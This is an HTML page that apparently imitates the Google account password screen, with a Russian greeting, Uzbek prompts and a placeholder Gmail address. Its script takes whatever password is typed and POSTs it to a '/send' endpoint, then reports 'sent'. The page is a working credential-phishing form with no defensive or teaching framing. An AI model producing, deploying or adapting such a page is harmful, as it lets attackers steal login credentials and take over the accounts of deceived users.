<!DOCTYPE html>
<html>
<head>
    <title>Password</title>

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #202124;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
        }

        .left {
            flex: 1;
        }

        .title {
            font-size: 32px;
        }

        .email {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #5f6368;
            border-radius: 20px;
            display: inline-block;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #5f6368;
            border-radius: 6px;
            background: transparent;
            color: white;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #8ab4f8;
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
            gap: 20px;
        }

        button {
            background: #8ab4f8;
            border: none;
            padding: 10px 25px;
            border-radius: 20px;
            cursor: pointer;
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="title">Добро пожаловать!</div>
        <div class="email">user@gmail.com</div>
    </div>

    <div class="right">

        <input id="msg2" type="password" placeholder="Parol kiriting">

        <div style="margin-top:10px;">
            <input type="checkbox" onclick="toggle()"> Показать пароль
        </div>

        <div class="bottom">
            <button onclick="send2()">Далее</button>
        </div>

    </div>

</div>

<script>
window.onload = () => {
    document.getElementById("msg2").focus();
};

function toggle() {
    const input = document.getElementById("msg2");
    input.type = input.type === "password" ? "text" : "password";
}

function send2() {
    const message = document.getElementById("msg2").value;

    if (!message) {
        alert("Parol yoz!");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        alert("Yuborildi ✅");
    });
}
</script>

</body>
</html>
